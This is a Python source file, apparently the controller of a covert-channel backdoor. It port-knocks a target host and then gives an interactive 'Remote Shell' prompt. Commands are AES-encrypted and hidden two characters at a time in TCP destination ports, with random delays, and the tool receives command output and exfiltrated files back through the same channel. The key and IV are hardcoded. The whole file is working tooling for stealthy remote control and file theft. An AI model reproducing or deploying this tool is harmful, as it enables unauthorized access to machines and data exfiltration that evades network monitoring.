import time
import argparse
import logging
import binascii
import collections
import base64
import sys
import readline
from random import uniform, randint
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from Crypto.Cipher import AES
from random import randint
from multiprocessing import Process
MASTER_KEY = "CorrectHorseBatteryStapleGunHead"
INIT_VALUE = "JohnCenaTheChamp"
OUTPUT = collections.defaultdict(list)


def encrypt_val(string):
	objAES = AES.new(MASTER_KEY, AES.MODE_CFB, INIT_VALUE)
	encryptedData = base64.b64encode(objAES.encrypt(string))
	return encryptedData


def decrypt_val(string):
	objAES = AES.new(MASTER_KEY, AES.MODE_CFB, INIT_VALUE)
	decryptedData = objAES.decrypt(base64.b64decode(string))
	return decryptedData


def verify_root():
	if(os.getuid() != 0):
		exit("This program must be run with root/sudo")


def binary_to_file(binary):
	string = ''.join(binary)
	decrypted = decrypt_val(string)
	decrypted = binascii.unhexlify('%x' % int(decrypted, 2))
	filename, data = decrypted.split('\0', 1)
	data = data.rstrip('\0').rstrip('\n')
	with open(filename, "wb") as f:
		f.write(data)


def generate_port():
	rand = randint(2000, 35000)
	if(str(rand) in OUTPUT):
		rand = generate_port()
	OUTPUT[str(rand)] = ""
	return rand


def char_packet(dest, sport, char1, char2=None):
	if(char2 is None):
		destport = ord(char1) << 8
	else:
		destport = (ord(char1) << 8) + ord(char2)
	return IP(dst=dest) / TCP(sport=sport, dport=destport)


def knock(destIP, ports):
	for port in ports:
		packet = IP(dst=destIP) / TCP(dport=port)
		send(packet, verbose=0)


def send_end_msg(dest, sport):
	randPort = randint(1500, 65535)
	packet = IP(dst=dest, id=42424) / TCP(dport=randPort, sport=sport)
	send(packet, verbose=0)


def delay_sleep():
	global args
	if(args.delay is None):
		return
	randRange = args.delay.split('-')
	size = len(randRange)
	if(size == 1):
		time.sleep(int(randRange[0]))
	elif(size == 2):
		sleeptime = uniform(int(randRange[0]), int(randRange[1]))
		print("Waiting for {}s".format(sleeptime))
		time.sleep(sleeptime)

	else:
		sys.exit("Invalid input for delay")


def get_result(packet):
	global OUTPUT
	sport = packet[2].sport
	if(packet[1].id == 42424):
		result = ''.join(OUTPUT[sport])
		sys.stdout.write('\r'+' '*(len(readline.get_line_buffer())+35)+'\r')
		print("Output from {}:".format(packet[1].src))
		print(decrypt_val(result))
		sys.stdout.write('[{}] Remote Shell$ '.format(args.destIP) + readline.get_line_buffer())
		sys.stdout.flush()
		del OUTPUT[sport]
	elif(packet[1].id == 41414):
		binary_to_file(OUTPUT[sport])
		del OUTPUT[sport]
	else:
		dport = packet[2].dport
		char1 = chr((dport >> 8) & 0xff)
		char2 = chr(dport & 0xff)
		if(char2 is not None):
			OUTPUT[sport] += "{}{}".format(char1, char2)
		else:
			OUTPUT[sport] += "{}".format(char1)


def send_cmd(msg):
	msg = encrypt_val(msg)
	sport = generate_port()
	for char1, char2 in zip(msg[0::2], msg[1::2]):
		delay_sleep()
		send(char_packet(args.destIP, sport, char1, char2), verbose=0)
	if(len(msg) % 2):
		delay_sleep()
		send(char_packet(args.destIP, sport, msg[len(msg) - 1]), verbose=0)
	send_end_msg(args.destIP, sport)


def disconnect():
	packet = IP(dst=args.destIP) / TCP(dport=4242)
	send(packet)


def scapySniff():
	sniff(filter="tcp and src {}".format(args.destIP), prn=get_result)


def main():
	verify_root()
	ports = [2525, 14156, 6364]
	knock(args.destIP, ports)

	sniffProc = Process(target=scapySniff)
	sniffProc.daemon = True
	sniffProc.start()
	while True:
		msg = raw_input('[{}] Remote Shell$ '.format(args.destIP))
		send_cmd(msg)
		# sniff(filter="tcp and src {}".format(args.destIP), stop_filter=get_result)
		

if __name__ == '__main__':
	parser = argparse.ArgumentParser("Python Covert Application")
	parser.add_argument('destIP', help="Destination address")
	parser.add_argument('-s', '--sport', help="Source port to send from, defaults to 80")
	parser.add_argument('-d', '--delay', help="Delay between each send in seconds. Range allowed with a dash")
	args = parser.parse_args()
	try:
		main()
	except KeyboardInterrupt:
		disconnect()
		exit("Ctrl+C received. Exiting...")